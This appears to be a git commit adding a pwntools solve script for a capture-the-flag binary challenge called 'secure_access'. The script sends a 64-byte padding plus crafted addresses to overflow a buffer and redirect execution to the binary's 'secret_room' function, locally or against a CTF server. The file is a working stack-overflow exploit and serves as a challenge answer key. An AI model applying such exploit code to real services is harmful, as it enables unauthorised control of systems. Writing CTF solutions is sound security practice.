9d75c5a18b37f0e96bf1b08ef010daa7ef26df3e
Saitomu <dung9126lol@gmail.com>
2026-01-21 17:50:22 +0700

    Add files via upload

---
+++ task3/MTA/secure_access/chall/solve.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.terminal = ["foot", "-e", "sh", "-c"]
+
+exe = ELF('chall', checksec=False)
+# libc = ELF('libc.so.6', checksec=False)
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
+sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+
+
+        c
+        ''')
+        sleep(1)
+
+
+if args.REMOTE:
+    p = remote('ctf.msec.cloud-ip.cc', 1001)
+else:
+    p = process([exe.path])
+GDB()
+
+load = flat(
+    b'A'*64,
+    0x404310,
+    exe.sym.secret_room
+)
+
+sla(b'Provide input to proceed:', load)
+
+p.interactive()
